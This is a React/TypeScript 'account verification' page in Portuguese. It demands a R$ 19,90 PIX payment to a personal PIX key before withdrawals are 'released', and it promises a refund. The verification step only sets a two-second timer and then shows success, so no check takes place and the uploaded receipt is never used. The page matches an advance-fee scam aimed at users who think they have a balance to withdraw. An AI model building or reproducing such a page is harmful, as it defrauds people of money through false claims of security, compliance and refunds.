import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Upload, Check, AlertCircle } from 'lucide-react';
import { useAuth } from '../context/AuthContext';

const Verification = () => {
  const { user } = useAuth();
  const navigate = useNavigate();
  const [file, setFile] = useState<File | null>(null);
  const [isUploading, setIsUploading] = useState(false);
  const [isVerified, setIsVerified] = useState(false);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setFile(e.target.files[0]);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) return;

    setIsUploading(true);

    // Simular o processo de upload e verificação
    setTimeout(() => {
      setIsUploading(false);
      setIsVerified(true);
    }, 2000);
  };

  if (!user) return null;

  if (isVerified) {
    return (
      <div className="container mx-auto px-4 py-8">
        <div className="max-w-2xl mx-auto bg-white rounded-lg shadow-md overflow-hidden">
          <div className="p-8 text-center">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Check size={32} className="text-green-600" />
            </div>
            <h2 className="text-2xl font-bold mb-2">Verificação em andamento!</h2>
            <p className="text-gray-600 mb-6">
              Seu processo de verificação foi iniciado. Em até 24 horas, seus saques estarão liberados.
            </p>
            <button
              onClick={() => navigate('/withdraw')}
              className="px-6 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors"
            >
              Voltar
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="container mx-auto px-4 py-8">
      <div className="max-w-2xl mx-auto bg-white rounded-lg shadow-md overflow-hidden">
        <div className="bg-gradient-to-r from-green-600 to-green-600 p-6 text-white">
          <h1 className="text-2xl font-bold mb-2">Verificação de Conta</h1>
          <p>Complete este processo para habilitar saques</p>
        </div>
        
        <div className="p-6">
          <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
            <div className="flex">
              <AlertCircle size={24} className="text-yellow-400 mr-3 flex-shrink-0" />
              <div>
                <p className="font-medium text-yellow-800">Verificação necessária</p>
                <p className="text-yellow-700 mt-1">
                  Para garantir a segurança e conformidade, precisamos verificar sua identidade antes de processar saques.
                </p>
              </div>
            </div>
          </div>
          
          <div className="mb-6">
            <h2 className="text-xl font-bold mb-4">Instruções para verificação</h2>
            <div className="bg-gray-50 p-4 rounded-lg">
              <ol className="list-decimal pl-5 space-y-3">
                <li className="text-gray-700">
                  <span className="font-medium">Realize um pagamento PIX</span> de R$ 19,90 para o PIX abaixo, o valor será devolvido logo após a verificação.
                  <div className="bg-white p-3 rounded border border-gray-200 mt-2 font-mono text-sm">
                    <div className="flex flex-col md:flex-row items-start md:items-center justify-between">
                      <span className="whitespace-normal break-all overflow-wrap break-word">
                        00020126580014br.gov.bcb.pix013675864bcb-5d8b-48f6-83a2-1387d03ec120520400005303986540519.905802BR5923GABRIELA S F NASCIMENTO6014Rio de Janeiro62290525IdTxa4b480f9d4064579817e96304E7AF
                      </span>
                      <button
                        onClick={() => {
                          navigator.clipboard.writeText('00020126580014br.gov.bcb.pix013675864bcb-5d8b-48f6-83a2-1387d03ec120520400005303986540519.905802BR5923GABRIELA S F NASCIMENTO6014Rio de Janeiro62290525IdTxa4b480f9d4064579817e96304E7AF');
                        }}
                        className="mt-2 md:mt-0 md:ml-2 px-3 py-1 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors text-sm"
                      >
                        Copiar
                      </button>
                    </div>
                  </div>
                </li>
                <li className="text-gray-700">
                  <span className="font-medium">Salve o comprovante</span> de pagamento (screenshot ou PDF).
                </li>
                <li className="text-gray-700">
                  <span className="font-medium">Envie o comprovante</span> através do formulário abaixo.
                </li>
              </ol>
            </div>
          </div>
          
          <form onSubmit={handleSubmit}>
            <div className="mb-6">
              <label className="block text-gray-700 font-medium mb-2">
                Comprovante de pagamento
              </label>
              <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center">
                {file ? (
                  <div className="text-green-600">
                    <Check size={24} className="mx-auto mb-2" />
                    <p className="font-medium">{file.name}</p>
                    <p className="text-sm text-gray-500 mt-1">
                      {(file.size / 1024).toFixed(2)} KB
                    </p>
                    <button
                      type="button"
                      onClick={() => setFile(null)}
                      className="mt-3 text-sm text-red-600 hover:text-red-800"
                    >
                      Remover arquivo
                    </button>
                  </div>
                ) : (
                  <div>
                    <Upload size={24} className="mx-auto mb-2 text-gray-400" />
                    <p className="text-gray-600 mb-2">
                      Arraste e solte seu comprovante aqui, ou
                    </p>
                    <label className="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors cursor-pointer inline-block">
                      Selecionar arquivo
                      <input
                        type="file"
                        className="hidden"
                        accept="image/*,.pdf"
                        onChange={handleFileChange}
                      />
                    </label>
                    <p className="text-xs text-gray-500 mt-2">
                      Formatos aceitos: JPG, PNG, PDF (máx. 5MB)
                    </p>
                  </div>
                )}
              </div>
            </div>
            
            <button
              type="submit"
              disabled={!file || isUploading}
              className={`w-full py-3 rounded-lg text-white font-medium ${
                !file || isUploading
                  ? 'bg-gray-400 cursor-not-allowed' 
                  : 'bg-green-600 hover:bg-green-700'
              }`}
            >
              {isUploading ? 'Enviando...' : 'Enviar Comprovante'}
            </button>
          </form>
          
          <div className="mt-6 text-sm text-gray-600">
            <p className="font-medium mb-1">Observações importantes:</p>
            <ul className="list-disc pl-5 space-y-1">
              <li>A verificação geralmente é concluída em até 24 horas.</li>
              <li>O valor de R$ 19,90 é uma taxa única de verificação, o valor será devolvido logo após a verificação.</li>
              <li>Certifique-se de que o comprovante esteja legível.</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Verification;